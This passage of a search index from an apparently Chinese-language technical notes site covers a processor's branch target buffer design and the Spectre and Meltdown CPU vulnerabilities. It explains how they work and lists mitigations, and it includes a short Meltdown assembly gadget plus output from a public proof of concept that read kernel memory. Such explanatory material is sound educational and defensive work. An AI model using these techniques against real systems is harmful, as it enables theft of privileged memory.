\u200b\u662f\u5426\u200b\u5408\u6cd5\u200b</li> <li>28 bit tag: \u200b\u7528\u4e8e\u200b\u627e\u5230\u200b\u5339\u914d\u200b\u7684\u200b\u5168\u200b\u76f8\u8fde\u200b\u7684\u200b entry\uff0c28 \u200b\u7b49\u4e8e\u200b 39(\u200b\u865a\u62df\u5730\u5740\u200b\u4f4d\u6570\u200b) - 5(\u200b\u4e00\u6b21\u200b fetch 32B) - 6(index \u200b\u4f4d\u6570\u200b\uff0clog2(64))</li> <li>13 bit lower: \u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u76f8\u5bf9\u200b\u5206\u652f\u200b\u5730\u5740\u200b\u7684\u200b\u504f\u79fb\u200b\uff0c\u200b\u7531\u4e8e\u200b\u6307\u4ee4\u200b\u5bf9\u9f50\u200b\u5230\u200b 2\uff0c\u200b\u4e0d\u200b\u9700\u8981\u200b\u4fdd\u5b58\u200b\u504f\u79fb\u200b\u7684\u200b\u6700\u4f4e\u200b 1 \u200b\u4f4d\u200b</li> <li>1 bit extend: \u200b\u5982\u679c\u200b lower \u200b\u4f4d\u6570\u200b\u4e0d\u591f\u200b\uff0c\u200b\u628a\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u4fdd\u5b58\u200b\u5728\u200b\u53e6\u5916\u200b\u7684\u200b\u5730\u65b9\u200b</li> </ul> <p>\u200b\u5f53\u200b\u504f\u79fb\u200b\u8fc7\u5927\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u5b58\u200b\u5230\u200b lower \u200b\u5185\u65f6\u200b\uff0cBTB \u200b\u4fdd\u5b58\u200b\u4e86\u200b\u989d\u5916\u200b 64 \u200b\u4e2a\u200b 39 \u200b\u4f4d\u200b\u5bbd\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u6570\u7ec4\u200b\uff0c\u200b\u76f4\u63a5\u200b\u6620\u5c04\u200b\uff0c\u200b\u5f53\u200b extern=1 \u200b\u65f6\u200b\u7528\u4e8e\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\u3002</p> <p>2 \u200b\u4f4d\u200b\u9971\u548c\u200b\u8ba1\u6570\u5668\u200b\u53e6\u5916\u200b\u7ef4\u62a4\u200b\u5728\u200b BIM \u200b\u7ed3\u6784\u200b\u5185\u200b\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u90e8\u4ef6\u200b\uff0c\u200b\u4f8b\u5982\u200b TAGE\uff0c\u200b\u90fd\u200b\u6309\u200b\u76f8\u540c\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7ec4\u4e86\u200b bank\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_8","title":"\u5357\u6e56","text":"<p>\u200b\u9999\u5c71\u200b\u5904\u7406\u5668\u200b\u524d\u7aef\u200b\u53d6\u6307\u200b\u67b6\u6784\u200b\u6f14\u8fdb\u200b</p> <p>\u200b\u96c1\u6816\u6e56\u200b\u662f\u200b coupled \u200b\u524d\u7aef\u200b\uff0c\u200b\u5357\u6e56\u200b\u6539\u6210\u200b\u4e86\u200b decoupled \u200b\u524d\u7aef\u200b\u3002\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u65b9\u9762\u200b\uff0c\u200b\u4e4b\u524d\u200b\u96c1\u6816\u6e56\u200b\u7684\u200b BTB \u200b\u662f\u200b\u6bcf\u4e2a\u200b\u5206\u652f\u200b\u4e00\u4e2a\u200b entry\uff0c\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\u9700\u8981\u200b\u5bf9\u200b 32B \u200b\u7684\u200b\u6bcf\u4e2a\u200b 2B \u200b\u5206\u522b\u200b\u9884\u6d4b\u200b\uff0c16 \u200b\u8def\u200b\u5e76\u884c\u200b\uff0c\u200b\u518d\u200b\u5904\u7406\u200b 16 \u200b\u8def\u200b\u7684\u200b\u7ed3\u679c\u200b\u3002\u200b\u5357\u6e56\u200b\u7684\u200b\u8bbe\u8ba1\u200b\u5219\u200b\u4e0d\u540c\u200b\uff0c\u200b\u6839\u636e\u200b fetch \u200b\u5730\u5740\u200b\uff0c\u200b\u9884\u6d4b\u200b\u4ece\u200b\u8fd9\u4e2a\u200b fetch \u200b\u5730\u5740\u200b\u5f00\u59cb\u200b\u7684\u200b 32B \u200b\u5b57\u8282\u200b\uff08\u200b\u4e0d\u200b\u4e00\u5b9a\u200b\u5bf9\u9f50\u200b\u5230\u200b\u7f13\u5b58\u200b\u884c\u200b\uff09\uff0c\u200b\u8fd9\u200b\u6bb5\u200b\u7a7a\u95f4\u200b\u5185\u200b\u7684\u200b\u6700\u200b\u591a\u200b\u4e24\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u3002\u200b\u8fd9\u6837\u200b\u505a\u200b\u7684\u200b\u539f\u56e0\u200b\u662f\u200b\uff0c\u200b\u5e38\u89c1\u200b\u7684\u200b\u4ee3\u7801\u200b\u91cc\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u5bc6\u5ea6\u200b\u5e76\u200b\u6ca1\u6709\u200b\u90a3\u4e48\u200b\u9ad8\u200b\uff0c\u200b\u4ee5\u200b 32B \u200b\u7684\u200b\u7c92\u5ea6\u200b\u67e5\u8be2\u200b 2 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u800c\u200b\u4e0d\u200b\u50cf\u200b\u96c1\u6816\u6e56\u200b\u90a3\u6837\u200b\u5e76\u884c\u200b\u67e5\u8be2\u200b 16 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002</p> <p>\u200b\u867d\u7136\u200b\u6700\u200b\u591a\u200b\u53ef\u4ee5\u200b\u8bb0\u5f55\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u4f46\u662f\u200b\u8bb0\u5f55\u200b\u4e24\u4e2a\u200b\u7684\u200b\u524d\u63d0\u200b\u662f\u200b\u7b2c\u4e00\u4e2a\u200b\u662f\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u6b64\u65f6\u200b\u540c\u65f6\u200b\u9884\u6d4b\u200b\u4e24\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b\u7b2c\u4e00\u6761\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u7528\u200b\u7b2c\u4e8c\u6761\u200b\u6307\u4ee4\u200b\u7684\u200b\u8df3\u8f6c\u200b\u65b9\u5411\u200b\u51b3\u5b9a\u200b\u4e0b\u200b\u4e00\u6b21\u200b\u9884\u6d4b\u200b\u7684\u200b\u5730\u5740\u200b\u3002\u200b\u5982\u679c\u200b\u7b2c\u4e00\u6761\u200b\u5c31\u662f\u200b\u76f4\u63a5\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u4fdd\u5b58\u200b\u7b2c\u4e8c\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u5c31\u200b\u6ca1\u6709\u200b\u610f\u4e49\u200b\u4e86\u200b\u3002\u200b\u5982\u679c\u200b 32B \u200b\u533a\u95f4\u200b\u5185\u6709\u200b\u591a\u4e8e\u200b\u4e24\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u9884\u6d4b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u6bcf\u6b21\u200b\u6700\u200b\u591a\u200b\u53ea\u80fd\u200b\u9884\u6d4b\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u4e0d\u200b\u8df3\u8f6c\u200b\u7684\u200b fallthrough \u200b\u5730\u5740\u200b\u6210\u4e3a\u200b\u7b2c\u4e8c\u4e2a\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u7684\u200b\u4e0b\u200b\u4e00\u6761\u200b\u5730\u5740\u200b\u3002\u200b\u800c\u200b\u4e0d\u662f\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\u52a0\u200b 32B\u3002</p> <p>\u200b\u5f53\u7136\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8bbe\u8ba1\u200b\u4e5f\u200b\u6709\u200b\u4e00\u4e2a\u200b\u7f3a\u70b9\u200b\uff1a\u200b\u540c\u200b\u4e00\u6761\u200b\u5206\u652f\u200b\u6307\u4ee4\u200b\u53ef\u80fd\u200b\u51fa\u73b0\u200b\u5728\u200b\u591a\u4e2a\u200b entry \u200b\u5f53\u4e2d\u200b\uff0c\u200b\u56e0\u4e3a\u200b\u4ed6\u4eec\u200b\u7684\u200b\u8d77\u59cb\u200b\u5730\u5740\u200b\u4e0d\u540c\u200b\u3002</p>"},{"location":"hardware/cpu_vulnerabilities.html","title":"CPU \u200b\u6f0f\u6d1e\u200b\u548c\u200b\u7f13\u89e3\u200b\u63aa\u65bd","text":""},{"location":"hardware/cpu_vulnerabilities.html#vulnerabilities","title":"\u6f0f\u6d1e\u200b Vulnerabilities","text":""},{"location":"hardware/cpu_vulnerabilities.html#spectre","title":"Spectre","text":"<ul> <li>\u200b\u8bba\u6587\u200b Spectre Attacks: Exploiting Speculative Execution</li> <li>Reading privileged memory with a side-channel</li> <li>Spectre Side Channels</li> <li>\u200b\u6709\u200b\u4e24\u4e2a\u200b\u53d8\u79cd\u200b\uff1aVariant 1 \u200b\u548c\u200b Variant 2\uff08Variant 3 \u200b\u662f\u200b Meltdown\uff09</li> <li>Variant 1: Bounds Check Bypass<ul> <li>CVE-2017-5753</li> <li>\u200b\u539f\u7406\u200b\uff1a\u200b\u8bbf\u95ee\u200b\u6570\u7ec4\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u901a\u5e38\u200b\u4f1a\u200b\u6709\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\uff0c\u200b\u8fd9\u4e2a\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u662f\u200b\u901a\u8fc7\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\u5b9e\u73b0\u200b\u7684\u200b\uff1b\u200b\u5373\u4f7f\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\u5931\u8d25\u200b\uff0c\u200b\u5982\u679c\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u9884\u6d4b\u200b\u5b83\u4f1a\u200b\u68c0\u67e5\u200b\u6210\u529f\u200b\uff0c\u200b\u5c31\u200b\u4f1a\u200b\u5bfc\u81f4\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b\u4ee3\u7801\u200b\u88ab\u200b\u6267\u884c\u200b\uff0c\u200b\u8fdb\u800c\u200b\u4ea7\u751f\u200b\u53ef\u4ee5\u200b\u88ab\u200b\u89c2\u5bdf\u200b\u5230\u200b\u7684\u200b\u526f\u4f5c\u7528\u200b</li> <li>\u200b\u653b\u51fb\u200b\u65b9\u6cd5\u200b\uff1a\u200b\u975e\u200b root \u200b\u7528\u6237\u200b\u5229\u7528\u200b eBPF \u200b\u5728\u200b\u5185\u6838\u200b\u6001\u4e2d\u200b\u8fd0\u884c\u200b\u81ea\u5b9a\u4e49\u200b\u4ee3\u7801\u200b\uff0c\u200b\u867d\u7136\u200b eBPF \u200b\u5f3a\u5236\u200b\u505a\u200b\u4e86\u200b\u8fb9\u754c\u200b\u68c0\u67e5\u200b\uff0c\u200b\u4f46\u200b\u5904\u7406\u5668\u200b\u4f1a\u200b\u6267\u884c\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\uff0c\u200b\u4ece\u800c\u200b\u6cc4\u6f0f\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u4fe1\u606f\u200b</li> <li>\u200b\u5177\u4f53\u200b\u5230\u200b Linux \u200b\u5185\u6838\u200b\u4e2d\u200b\uff0c\u200b\u6709\u200b\u4e00\u4e2a\u200b\u573a\u666f\u200b\u662f\u200b swapgs\uff1a\u200b\u5728\u200b\u5207\u6362\u200b\u4e0a\u4e0b\u6587\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9700\u8981\u200b\u5207\u6362\u200b gs \u200b\u6bb5\u200b\u7684\u200b\u57fa\u200b\u5730\u5740\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e2a\u200b\u57fa\u200b\u5730\u5740\u200b\u5e94\u8be5\u200b\u7528\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u8fd8\u662f\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\uff0c\u200b\u5c31\u8981\u200b\u6839\u636e\u200b\u5177\u4f53\u60c5\u51b5\u200b\u6765\u200b\u5224\u65ad\u200b\uff0c\u200b\u800c\u200b\u8fd9\u200b\u5c31\u200b\u4f1a\u200b\u5f15\u5165\u200b\u6761\u4ef6\u200b\u5206\u652f\u200b\uff1a     <pre><code>if (coming from user space)\n    swapgs\nmov %gs:&lt;percpu_offset&gt;, %reg\nmov (%reg), %reg1\n</code></pre></li> <li>\u200b\u5982\u679c\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u5728\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u7684\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\uff0c\u200b\u8df3\u8fc7\u200b\u4e86\u200b swapgs\uff0c\u200b\u76f4\u63a5\u200b\u7528\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u57fa\u200b\u5730\u5740\u200b\u53bb\u200b\u8bbf\u95ee\u200b\u5185\u5b58\u200b\uff0c\u200b\u5c31\u200b\u4ea7\u751f\u200b\u4e86\u200b\u5b89\u5168\u200b\u95ee\u9898\u200b</li> <li>\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u95ee\u9898\u200b\u8fd8\u200b\u51fa\u73b0\u200b\u5728\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u590d\u5236\u200b\u6570\u636e\u200b\u7684\u200b\u65f6\u5019\u200b\uff1a\u200b\u9700\u8981\u200b\u8c03\u7528\u200b <code>access_ok</code> \u200b\u51fd\u6570\u200b\u6765\u200b\u5224\u65ad\u200b\u6307\u9488\u200b\u662f\u5426\u200b\u5408\u6cd5\u200b\uff0c\u200b\u4f46\u200b\u8fd9\u4e2a\u200b\u5224\u65ad\u200b\u4e5f\u200b\u9700\u8981\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u5728\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u4ea7\u751f\u200b\u95ee\u9898\u200b</li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>Bounds Clipping</li> <li>\u200b\u7279\u5b9a\u200b\u573a\u666f\u200b\u4e0b\u200b\uff08\u200b\u4f8b\u5982\u200b usercopy \u200b\u548c\u200b swapgs\uff09\u200b\u52a0\u5165\u200b lfence \u200b\u6307\u4ee4\u200b\u963b\u6b62\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u7684\u200b load \u200b\u6307\u4ee4\u200b\u88ab\u200b\u6267\u884c\u200b</li> <li>Supervisor-Mode Access Prevention (SMAP)</li> <li>__user pointer sanitization</li> </ul> </li> </ul> </li> <li>Variant 2: Branch Target Injection (BTI)<ul> <li>CVE-2017-5715</li> <li>\u200b\u539f\u7406\u200b\uff1aCPU \u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\u662f\u200b\u5168\u5c40\u200b\u5171\u4eab\u200b\u7684\u200b\uff0c\u200b\u56e0\u6b64\u200b\u53ef\u4ee5\u200b\u5728\u200b\u865a\u62df\u673a\u200b\u5185\u200b\u63a7\u5236\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\uff0c\u200b\u5f53\u200b CPU \u200b\u63a7\u5236\u6743\u200b\u56de\u5230\u200b\u5bbf\u4e3b\u673a\u200b\u65f6\u200b\uff08\u200b\u6bd4\u5982\u200b\u8fdb\u884c\u200b\u4e00\u6b21\u200b hypercall\uff09\uff0cCPU \u200b\u4f1a\u200b\u4f7f\u7528\u200b\u865a\u62df\u673a\u200b\u51c6\u5907\u200b\u597d\u200b\u7684\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\u7684\u200b\u72b6\u6001\u200b\u6765\u200b\u8fdb\u884c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff0c\u200b\u4ece\u800c\u200b\u63a8\u6d4b\u200b\u6267\u884c\u200b\u4e86\u200b\u539f\u672c\u200b\u5bbf\u4e3b\u673a\u200b\u4e0d\u4f1a\u200b\u6267\u884c\u200b\u7684\u200b\u4ee3\u7801\u200b\uff0c\u200b\u5177\u4f53\u65b9\u6cd5\u200b\u662f\u200b\u6b3a\u9a97\u200b BTB \u200b\u6216\u200b\u95f4\u63a5\u200b\u5206\u652f\u200b\u9884\u6d4b\u5668\u200b\uff0c\u200b\u6ce8\u5165\u200b\u653b\u51fb\u8005\u200b\u6307\u5b9a\u200b\u7684\u200b\u5206\u652f\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u4f7f\u5f97\u200b CPU \u200b\u5728\u200b\u9884\u6d4b\u200b\u9519\u8bef\u200b\u8def\u5f84\u200b\u4e0a\u200b\u9884\u6d4b\u200b\u6267\u884c\u200b\u653b\u51fb\u8005\u200b\u6307\u5b9a\u200b\u7684\u200b\u4ee3\u7801\u200b\uff1b\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u7528\u4e8e\u200b\u4ece\u200b\u7528\u6237\u200b\u6001\u200b\u653b\u51fb\u200b\u5185\u6838\u200b\u6001\u200b</li> <li>\u200b\u7528\u200b\u7c7b\u4f3c\u200b\u7684\u200b\u65b9\u6cd5\u200b\uff0c\u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u6ce8\u5165\u200b Return Stack Buffer\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u5bf9\u200b return \u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u7684\u200b\u9884\u6d4b\u200b</li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>Retpoline</li> <li>Indirect Branch Restricted Speculation (IBRS)</li> <li>Enhanced Indirect Branch Restricted Speculation (Enhanced IBRS)</li> <li>Single Threaded Indirect Branch Predictors (STIBP)</li> <li>Indirect Branch Prediction Barrier (IBPB)</li> <li>Supervisor-Mode Execution Prevention (SMEP)</li> </ul> </li> </ul> </li> </ul>"},{"location":"hardware/cpu_vulnerabilities.html#meltdown-rouge-data-cache-load","title":"Meltdown (Rouge Data Cache Load)","text":"<ul> <li>\u200b\u8bba\u6587\u200b Meltdown: Reading Kernel Memory from User Space</li> <li>Reading privileged memory with a side-channel</li> <li>CVE-2017-5754</li> <li>Rogue Data Cache Load / CVE-2017-5754 / INTEL-SA-00088</li> <li>Meltdown \u200b\u548c\u200b Spectre \u200b\u4e00\u8d77\u200b\u88ab\u200b\u63d0\u51fa\u200b\uff0c\u200b\u5176\u4e2d\u200b Variant 1 \u200b\u548c\u200b 2 \u200b\u5c5e\u4e8e\u200b Spectre\uff0cVariant 3 \u200b\u5c31\u662f\u200b Meltdown</li> <li>\u200b\u5141\u8bb8\u200b\u7528\u6237\u200b\u6001\u200b\u7a0b\u5e8f\u200b\u8bfb\u53d6\u200b\u5b8c\u6574\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u7a7a\u95f4\u200b</li> <li>\u200b\u539f\u7406\u200b\uff1a<ul> <li>\u200b\u786c\u4ef6\u200b\u4e3a\u4e86\u200b\u6027\u80fd\u200b\uff0c\u200b\u5728\u200b\u9a8c\u8bc1\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u6743\u9650\u200b\u662f\u5426\u200b\u6b63\u786e\u200b\u4e4b\u524d\u200b\uff0c\u200b\u63d0\u524d\u200b\u628a\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u4f20\u9012\u200b\u7ed9\u200b\u4e86\u200b\u540e\u7eed\u200b\u7684\u200b\u6307\u4ee4\u200b\uff0c\u200b\u540e\u7eed\u200b\u53d1\u73b0\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7684\u200b\u6743\u9650\u200b\u9519\u8bef\u200b\u540e\u200b\uff0c\u200b\u518d\u200b\u8fdb\u884c\u200b\u56de\u6eda\u200b</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u9875\u8868\u200b\u4e2d\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u5730\u5740\u200b\u4e5f\u200b\u88ab\u200b\u6620\u5c04\u200b\u4e86\u200b\uff0c\u200b\u53ea\u4e0d\u8fc7\u200b\u8bbe\u7f6e\u200b\u4e86\u200b\u6743\u9650\u200b\u4f4d\u200b\uff0c\u200b\u7981\u6b62\u200b\u7528\u6237\u200b\u6001\u200b\u8bbf\u95ee\u200b</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u200b\u8bbf\u95ee\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\u4f1a\u200b\u89e6\u53d1\u200b\u5f02\u5e38\u200b\uff0c\u200b\u4f46\u200b\u5982\u679c\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u901a\u8fc7\u200b\u67d0\u79cd\u200b\u65b9\u5f0f\u200b\u5e26\u6765\u200b\u4e86\u200b\u526f\u4f5c\u7528\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u77e5\u9053\u200b load \u200b\u7684\u200b\u7ed3\u679c\u200b\u662f\u200b\u591a\u5c11\u200b</li> <li>\u200b\u4e3a\u4e86\u200b\u5229\u7528\u200b\u526f\u4f5c\u7528\u200b\u6765\u200b\u5f97\u5230\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u9996\u5148\u200b\u628a\u200b\u4e00\u4e2a\u200b\u6570\u7ec4\u200b\u4ece\u200b\u7f13\u5b58\u200b\u4e2d\u200b\u6e05\u7a7a\u200b\uff0c\u200b\u518d\u200b\u628a\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\u79fb\u4f4d\u200b\u540e\u200b\u4f5c\u4e3a\u200b\u4e0b\u6807\u200b\u53bb\u200b\u8bbf\u95ee\u200b\u6570\u7ec4\u200b\uff0c\u200b\u90a3\u4e48\u200b\u526f\u4f5c\u7528\u200b\u5c31\u662f\u200b\u628a\u200b\u5bf9\u5e94\u200b\u4f4d\u7f6e\u200b\u7684\u200b\u7f13\u5b58\u200b\u884c\u200b\u52a0\u8f7d\u200b\u5230\u200b\u7f13\u5b58\u200b\u5f53\u4e2d\u200b</li> <li>\u200b\u6700\u540e\u200b\u518d\u200b\u6d4b\u91cf\u200b\u7f13\u5b58\u200b\u884c\u200b\u7684\u200b\u8bbf\u95ee\u200b\u65f6\u95f4\u200b\uff0c\u200b\u4ece\u800c\u200b\u77e5\u9053\u200b\u4e4b\u524d\u200b\u54ea\u4e2a\u200b\u7f13\u5b58\u200b\u884c\u200b\u901a\u8fc7\u200b\u526f\u4f5c\u7528\u200b\u88ab\u200b\u52a0\u8f7d\u200b\u5230\u200b\u7f13\u5b58\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u4ece\u800c\u200b\u5f97\u5230\u200b load \u200b\u6307\u4ee4\u200b\u7684\u200b\u7ed3\u679c\u200b\uff0c\u200b\u800c\u200b\u8fd9\u200b\u672c\u6765\u200b\u662f\u200b\u53ea\u6709\u200b\u5728\u200b\u5185\u6838\u200b\u6001\u200b\u624d\u80fd\u200b\u8bbf\u95ee\u200b\u7684\u200b\u6570\u636e\u200b</li> <li>\u200b\u7531\u4e8e\u200b\u65f6\u95f4\u200b\u7a97\u53e3\u200b\u6bd4\u8f83\u200b\u5c0f\u200b\uff0c\u200b\u5982\u679c\u200b\u8bbf\u95ee\u200b\u7684\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b\u6570\u636e\u200b\u4e0d\u200b\u5728\u200b L1 \u200b\u6570\u636e\u200b\u7f13\u5b58\u200b\u4e2d\u200b\uff0c\u200b\u53ef\u80fd\u200b\u4f1a\u200b\u6765\u4e0d\u53ca\u200b\u4ea7\u751f\u200b\u526f\u4f5c\u7528\u200b</li> </ul> </li> <li>\u200b\u4ee3\u7801\u200b\uff1a     <pre><code>; rcx = kernel address, rbx = probe array\nmov al, byte [rcx]         ; read one byte from kernel space\nshl rax, 0xc               ; multiply by 4096\nmov rbx, qword [rbx + rax] ; access probe array\n</code></pre></li> <li>\u200b\u4ece\u200b\u5185\u6838\u200b\u5730\u5740\u200b rcx \u200b\u8bfb\u53d6\u200b\u4e00\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u5de6\u79fb\u200b 0xc\uff0c\u200b\u4e5f\u200b\u5c31\u662f\u200b\u4e58\u4ee5\u200b 4096\uff0c\u200b\u518d\u200b\u53bb\u200b\u8bbf\u95ee\u200b rbx \u200b\u6307\u5411\u200b\u7684\u200b\u6570\u7ec4\u200b\u3002\u200b\u90a3\u4e48\u200b\u6bcf\u4e2a\u200b\u53ef\u80fd\u200b\u7684\u200b al \u200b\u653e\u5728\u200b\u4e0d\u540c\u200b\u7684\u200b\u9875\u200b\u4e0a\u200b\uff0c\u200b\u907f\u514d\u200b\u9884\u53d6\u5668\u200b\u5e72\u6270\u200b\u540e\u7eed\u200b\u7684\u200b\u6d4b\u91cf\u200b</li> <li>\u200b\u7f13\u89e3\u200b\u63aa\u65bd\u200b\uff1a<ul> <li>\u200b\u8f6f\u4ef6\u200b\u4e0a\u200b\uff1aKernel Page Table Isolation</li> <li>\u200b\u786c\u4ef6\u200b\u4e0a\u200b\uff1a\u200b\u63d0\u65e9\u200b\u5bf9\u200b\u6743\u9650\u200b\u7684\u200b\u68c0\u67e5\u200b\uff0c\u200b\u907f\u514d\u200b\u4ee5\u200b\u9519\u8bef\u200b\u6743\u9650\u200b\u8bfb\u51fa\u6765\u200b\u7684\u200b\u6570\u636e\u200b\u88ab\u200b\u7528\u4e8e\u200b\u540e\u7eed\u200b\u7684\u200b\u6307\u4ee4\u200b</li> </ul> </li> <li>PoC\uff1aIAIK/meltdown paboldin/meltdown-exploit\uff0c\u200b\u4e0b\u9762\u200b\u5206\u6790\u200b\u540e\u200b\u4e00\u4e2a\u200b PoC\uff1a<ul> <li>\u200b\u8fd9\u4e2a\u200b PoC \u200b\u5148\u200b\u7528\u200b root \u200b\u6743\u9650\u200b\u8bfb\u53d6\u200b <code>/proc/kallsyms</code>\uff0c\u200b\u627e\u5230\u200b\u5185\u6838\u200b\u7b26\u53f7\u200b <code>linux_proc_banner</code> \u200b\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u8fd9\u200b\u4e3b\u8981\u200b\u662f\u200b\u4e3a\u4e86\u200b\u5c55\u793a\u200b\uff0c\u200b\u65b9\u4fbf\u200b\u62ff\u5230\u200b\u5185\u6838\u200b\u6001\u200b\u5730\u5740\u200b\uff0c\u200b\u5b9e\u9645\u200b\u653b\u51fb\u8005\u200b\u662f\u200b\u6ca1\u6709\u200b root \u200b\u6743\u9650\u200b\u7684\u200b</li> <li>\u200b\u8bbf\u95ee\u200b <code>/proc/version</code>\uff0c\u200b\u4f7f\u5f97\u200b <code>linux_proc_banner</code> \u200b\u7b26\u53f7\u200b\u5728\u200b\u7f13\u5b58\u200b\u4e2d\u200b</li> <li>\u200b\u5728\u200b\u7528\u6237\u200b\u6001\u7528\u200b Meltdown \u200b\u8bfb\u53d6\u200b\u5185\u6838\u200b\u6001\u200b\u7684\u200b <code>linux_proc_banner</code> \u200b\u7684\u200b\u7ed3\u679c\u200b</li> <li>\u200b\u5728\u200b Intel Xeon E5-2603 v4 \u200b\u4e0a\u200b\u5173\u95ed\u200b KPTI\uff08\u200b\u5185\u6838\u200b cmdline \u200b\u6dfb\u52a0\u200b <code>mitigations=off</code>\uff09\u200b\u540e\u200b\u6210\u529f\u200b\u590d\u73b0\u200b\uff0c\u200b\u6210\u529f\u200b\u8bfb\u51fa\u6765\u200b <code>%s version %s (d</code>\uff1a     <pre><code>cached = 30, uncached = 316, threshold 97\nread ffffffffa2400260 = 25 % (score=999/1000)\nread ffffffffa2400261 = 73 s (score=1000/1000)\nread ffffffffa2400262 = 20   (score=1000/1000)\nread ffffffffa2400263 = 76 v (score=1000/1000)\nread ffffffffa2400264 = 65 e (score=1000/1000)\nread ffffffffa2400265 = 72 r (score=1000/1000)\nread ffffffffa2400266 = 73 s (score=1000/1000)\nread ffffffffa2400267 = 69 i (score=1000/1000)\nread ffffffffa2400268 = 6f o (score=1000/1000)\nread ffffffffa2400269 = 6e n (score=1000/1000)\nread ffffffffa240026a = 20   (score=1000/1000)\nread ffffffffa240026b = 25 % (score=1000/1000)\nread ffffffffa240026c = 73 s (score=1000/1000)\nread ffffffffa240026d = 20   (score=1000/1000)\nread ffffffffa240026e = 28 ( (score=1000/1000)\nread ffffffffa240026f = 64 d (score=1000/1000)\nVULNERABLE\n</code></pre></li> 